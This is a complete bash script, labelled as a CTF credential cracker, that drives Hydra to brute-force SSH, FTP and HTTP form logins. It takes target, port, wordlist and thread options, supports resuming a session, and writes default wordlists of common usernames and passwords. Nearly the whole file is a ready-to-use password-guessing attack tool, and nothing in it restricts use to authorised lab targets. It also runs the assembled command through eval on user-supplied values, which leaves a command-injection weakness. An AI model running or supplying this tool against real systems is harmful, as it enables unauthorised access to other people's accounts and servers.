#!/bin/bash

# =============================================
# SSH Brute Force Script 
# - Multiple attack methods (SSH, FTP, HTTP)
# - Wordlist management
# - Session resuming
# - Verbose output options
# - IP/port validation
# =============================================

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;36m'
NC='\033[0m' 

# defaults
DEFAULT_THREADS=4
DEFAULT_TIMEOUT=30
DEFAULT_USERNAME_LIST="users.txt"
DEFAULT_PASSWORD_LIST="passwords.txt"
RESTORE_FILE=".hydra.restore"

# Banner function
show_banner() {
    clear
    echo -e "${BLUE}=============================================${NC}"
    echo -e "${BLUE}        CTF CREDENTIAL CRACKER v1.0         ${NC}"
    echo -e "${BLUE}=============================================${NC}"
    echo -e "${YELLOW}A multi-protocol authentication brute forcer${NC}"
    echo
}

# Help function
show_help() {
    echo -e "${GREEN}Usage:${NC}"
    echo -e "  ./$(basename "$0") [options]"
    echo
    echo -e "${GREEN}Options:${NC}"
    echo -e "  -h, --help           Show this help message"
    echo -e "  -t, --target IP      Target IP address"
    echo -e "  -p, --port PORT      Target port (default: protocol standard port)"
    echo -e "  -u, --userlist FILE  Username list (default: users.txt)"
    echo -e "  -P, --passlist FILE  Password list (default: passwords.txt)"
    echo -e "  -s, --service TYPE   Service type: ssh, ftp, http-get, http-post (default: ssh)"
    echo -e "  -T, --threads NUM    Number of parallel threads (default: 4)"
    echo -e "  -r, --restore        Restore previous session"
    echo -e "  -v, --verbose        Verbose output"
    echo
    echo -e "${GREEN}Examples:${NC}"
    echo -e "  ./$(basename "$0") -t 192.168.1.100 -s ssh"
    echo -e "  ./$(basename "$0") -t 10.10.10.10 -s ftp -u ftpusers.txt -P common_passwords.txt"
    echo -e "  ./$(basename "$0") -t ctf.example.com -s http-post -p 8080"
}

# Check if Hydra is installed
check_dependencies() {
    if ! command -v hydra &> /dev/null; then
        echo -e "${RED}[!] Error: Hydra is not installed${NC}"
        echo -e "${YELLOW}[*] Install it with: sudo apt install hydra${NC}"
        exit 1
    fi
}

# Function to check if a file exists and is readable
check_file() {
    if [ ! -f "$1" ] || [ ! -r "$1" ]; then
        echo -e "${RED}[!] Error: File '$1' does not exist or is not readable${NC}"
        return 1
    fi
    
    # Check if file is empty
    if [ ! -s "$1" ]; then
        echo -e "${YELLOW}[!] Warning: File '$1' is empty${NC}"
    else
        local count=$(wc -l < "$1")
        echo -e "${BLUE}[*] Using '$1' with $count entries${NC}"
    fi
    return 0
}

# Function to validate IP address
validate_ip() {
    local ip=$1
    local stat=1
    
    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -le 255 && ${ip[1]} -le 255 && ${ip[2]} -le 255 && ${ip[3]} -le 255 ]]
        stat=$?
    fi
    
    if [[ $stat -eq 0 ]]; then
        echo -e "${GREEN}[+] Valid IP address: $1${NC}"
        return 0
    else
        # Check if it's a hostname
        if [[ $1 =~ ^[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?)*$ ]]; then
            echo -e "${YELLOW}[!] Using hostname: $1${NC}"
            return 0
        else
            echo -e "${RED}[!] Invalid IP address or hostname: $1${NC}"
            return 1
        fi
    fi
}

# Function to build and execute Hydra command
run_hydra() {
    local target=$1
    local service=$2
    local userlist=$3
    local passlist=$4
    local port=$5
    local threads=$6
    local verbose=$7
    
    # Build the base command
    local command="hydra"
    
    # Add verbosity if requested
    if [ "$verbose" = true ]; then
        command="$command -V"
    fi
    
    # Add restore file option
    command="$command -I"
    
    # Add thread count
    command="$command -t $threads"
    
    # Add userlist and passlist
    command="$command -L $userlist -P $passlist"
    
    # Build target specification
    if [ -n "$port" ]; then
        case $service in
            "http-get"|"http-post")
                # For HTTP services, the syntax is different
                command="$command $service://$target:$port/"
                ;;
            *)
                command="$command $service://$target:$port"
                ;;
        esac
    else
        command="$command $service://$target"
    fi
    
    # Execute the command
    echo -e "${BLUE}[*] Executing: $command${NC}"
    echo -e "${YELLOW}[*] Attack started at $(date)${NC}"
    echo -e "${YELLOW}[*] Press Ctrl+C to pause (you can resume later with -r option)${NC}"
    echo
    
    # Run the command
    eval "$command"
    
    # Check the exit status
    if [ $? -eq 0 ]; then
        echo -e "${GREEN}[+] Attack completed successfully${NC}"
    else
        if [ -f "$RESTORE_FILE" ]; then
            echo -e "${YELLOW}[!] Attack interrupted. You can resume later with -r option${NC}"
        else
            echo -e "${RED}[!] Attack failed${NC}"
        fi
    fi
}

# Function to generate wordlists if needed
generate_wordlist() {
    local type=$1
    local filename=$2
    
    if [ -f "$filename" ]; then
        return 0
    fi
    
    echo -e "${YELLOW}[!] Wordlist $filename not found. Creating a basic one...${NC}"
    
    if [ "$type" = "users" ]; then
        cat > "$filename" << EOF
root
admin
user
guest
administrator
ctf
flag
ssh
test
oracle
mysql
postgres
ubuntu
debian
centos
EOF
        echo -e "${GREEN}[+] Created basic username list${NC}"
    elif [ "$type" = "passwords" ]; then
        cat > "$filename" << EOF
password
123456
admin
root
toor
qwerty
letmein
changeme
secret
password123
admin123
P@ssw0rd
Flag123
CTF2023
test123
welcome1
EOF
        echo -e "${GREEN}[+] Created basic password list${NC}"
    fi
}

# Main function
main() {
    show_banner
    check_dependencies
    
    # Initialize variables
    local TARGET=""
    local PORT=""
    local USERLIST="$DEFAULT_USERNAME_LIST"
    local PASSLIST="$DEFAULT_PASSWORD_LIST"
    local SERVICE="ssh"
    local THREADS="$DEFAULT_THREADS"
    local RESTORE=false
    local VERBOSE=false
    
    # Parse command line arguments
    if [ $# -eq 0 ]; then
        # Interactive mode if no arguments
        echo -e "${BLUE}[*] Enter target IP/hostname:${NC}"
        read -r TARGET
        
        echo -e "${BLUE}[*] Select service:${NC}"
        echo "1. SSH (default)"
        echo "2. FTP"
        echo "3. HTTP-GET Form"
        echo "4. HTTP-POST Form"
        read -r service_choice
        
        case $service_choice in
            2) SERVICE="ftp" ;;
            3) SERVICE="http-get" ;;
            4) SERVICE="http-post" ;;
            *) SERVICE="ssh" ;;
        esac
        
        echo -e "${BLUE}[*] Enter port (leave empty for default):${NC}"
        read -r PORT
        
        echo -e "${BLUE}[*] Username list (default: $DEFAULT_USERNAME_LIST):${NC}"
        read -r temp_userlist
        if [ -n "$temp_userlist" ]; then
            USERLIST="$temp_userlist"
        fi
        
        echo -e "${BLUE}[*] Password list (default: $DEFAULT_PASSWORD_LIST):${NC}"
        read -r temp_passlist
        if [ -n "$temp_passlist" ]; then
            PASSLIST="$temp_passlist"
        fi
        
        echo -e "${BLUE}[*] Number of threads (default: $DEFAULT_THREADS):${NC}"
        read -r temp_threads
        if [ -n "$temp_threads" ]; then
            THREADS="$temp_threads"
        fi
    else
        # Parse command line arguments
        while [ $# -gt 0 ]; do
            case "$1" in
                -h|--help)
                    show_help
                    exit 0
                    ;;
                -t|--target)
                    TARGET="$2"
                    shift 2
                    ;;
                -p|--port)
                    PORT="$2"
                    shift 2
                    ;;
                -u|--userlist)
                    USERLIST="$2"
                    shift 2
                    ;;
                -P|--passlist)
                    PASSLIST="$2"
                    shift 2
                    ;;
                -s|--service)
                    SERVICE="$2"
                    shift 2
                    ;;
                -T|--threads)
                    THREADS="$2"
                    shift 2
                    ;;
                -r|--restore)
                    RESTORE=true
                    shift
                    ;;
                -v|--verbose)
                    VERBOSE=true
                    shift
                    ;;
                *)
                    echo -e "${RED}[!] Unknown option: $1${NC}"
                    show_help
                    exit 1
                    ;;
            esac
        done
    fi
    
    # If restore option is selected
    if [ "$RESTORE" = true ]; then
        if [ -f "$RESTORE_FILE" ]; then
            echo -e "${GREEN}[+] Restoring previous session...${NC}"
            hydra -R
            exit 0
        else
            echo -e "${RED}[!] No restore file found${NC}"
            exit 1
        fi
    fi
    
    # validate target
    if [ -z "$TARGET" ]; then
        echo -e "${RED}[!] Error: Target IP/hostname not specified${NC}"
        exit 1
    fi
    
    # validate target IP/hostname
    validate_ip "$TARGET" || exit 1
    
    # generate wordlists if they don't exist
    generate_wordlist "users" "$USERLIST"
    generate_wordlist "passwords" "$PASSLIST"
    
    # check if wordlists exist and are readable
    check_file "$USERLIST" || exit 1
    check_file "$PASSLIST" || exit 1
    
    # show attack summary
    echo -e "${GREEN}[+] Attack Summary:${NC}"
    echo -e "    Target:      ${YELLOW}$TARGET${NC}"
    echo -e "    Service:     ${YELLOW}$SERVICE${NC}"
    if [ -n "$PORT" ]; then
        echo -e "    Port:        ${YELLOW}$PORT${NC}"
    else
        echo -e "    Port:        ${YELLOW}(default)${NC}"
    fi
    echo -e "    Username List: ${YELLOW}$USERLIST${NC} ($(wc -l < "$USERLIST") entries)"
    echo -e "    Password List: ${YELLOW}$PASSLIST${NC} ($(wc -l < "$PASSLIST") entries)"
    echo -e "    Threads:      ${YELLOW}$THREADS${NC}"
    echo
    
    # ask for confirmation
    echo -e "${BLUE}[*] Start the attack? (y/n)${NC}"
    read -r confirm
    if [[ ! "$confirm" =~ ^[Yy]$ ]]; then
        echo -e "${RED}[!] Attack aborted by user${NC}"
        exit 0
    fi
    
    # run Hydra
    run_hydra "$TARGET" "$SERVICE" "$USERLIST" "$PASSLIST" "$PORT" "$THREADS" "$VERBOSE"
}

# Call main
main "$@"
